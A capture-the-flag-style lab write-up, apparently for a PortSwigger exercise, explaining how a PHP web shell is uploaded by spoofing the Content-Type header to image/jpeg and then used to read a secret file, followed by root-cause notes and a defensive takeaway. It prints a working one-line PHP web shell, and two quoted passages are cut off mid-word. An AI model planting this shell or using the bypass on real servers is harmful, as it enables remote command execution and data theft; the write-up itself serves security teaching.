# Web shell upload via Content-Type restriction bypass

### Goal - 

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`

### Analysis/Exploitation -

Login as user `wiener`:

In the account settings, I can set both an email address and an avatar image for the user.

upload a normal image file

![](./images/c755dab55ab2_001.png)

try to upload the PHP script  
`<?php system($_GET['cmd']); ?>`

![](./images/c755dab55ab2_002.png)

It shows the values for Content-Type that are permitted.

![](./images/c755dab55ab2_003.png)

the `Content-Type` is `application/x-php` and it can be fully-controlled by the attacker.

We can just simply change the `Content-Type` from `application/x-php` to `image/jpeg` or `image/png`

![](./images/c755dab55ab2_004.png)

The file name remained as `webShell.php` so that the server can execute it. Calling the uploaded script with parameter shows the secret data:

the uploaded file stored in `/files/avatar/<filename>`. Let’s trigger the web shell and `cat` the `secret`

via BurpSuite

![](./images/c755dab55ab2_005.png)

via Browser

![](./images/c755dab55ab2_006.png)

via command Curl

![](./images/c755dab55ab2_007.png)

### Why It Works

The exploit succeeds because this lab contains a vulnerable image upload function. it attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

The official solution confirms: Log in and upload an image as your avatar, then go back to your account page. In Burp, go to Proxy &gt; HTTP history and notice that your image was fe

The root cause is a failure in the application's security architecture specific to this file upload scenario — the server does not properly validate or secure the user-controlled input that reaches the vulnerable operation.

### Key Takeaways

- This lab contains vulnerable image upload function, demonstrating how file upload vulnerabilities manifest in real applications.
- The vulnerability is exploitable because user input reaches a sensitive operation without adequate server-side validation.
- PortSwigger confirms: "This lab contains a vulnerable image upload function. It attempts to prevent users from uploading un"
- Validate file content (magic bytes), not just extensions or Content-Type headers.
